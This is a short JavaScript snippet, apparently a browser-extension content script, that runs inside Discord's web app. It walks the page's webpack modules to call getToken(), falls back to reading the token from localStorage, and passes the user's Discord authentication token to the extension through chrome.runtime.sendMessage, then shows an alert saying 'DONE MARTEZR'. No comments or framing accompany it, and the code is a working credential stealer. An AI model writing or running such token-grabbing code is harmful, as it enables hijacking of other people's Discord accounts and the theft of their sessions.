(function() {
    try {
        window.webpackChunkdiscord_app.push([[Math.random()],{},(e)=>{
            for(const m in e.c){
                if(e.c[m].exports?.default?.getToken){
                    const t = e.c[m].exports.default.getToken();
                    if(t) chrome.runtime.sendMessage({token: t});
                }
            }
        }]);
    } catch (e) {
        const t = localStorage.getItem('token')?.replace(/"/g, "");
        if (t) chrome.runtime.sendMessage({token: t});
    }
    alert("DONE MARTEZR");
})();
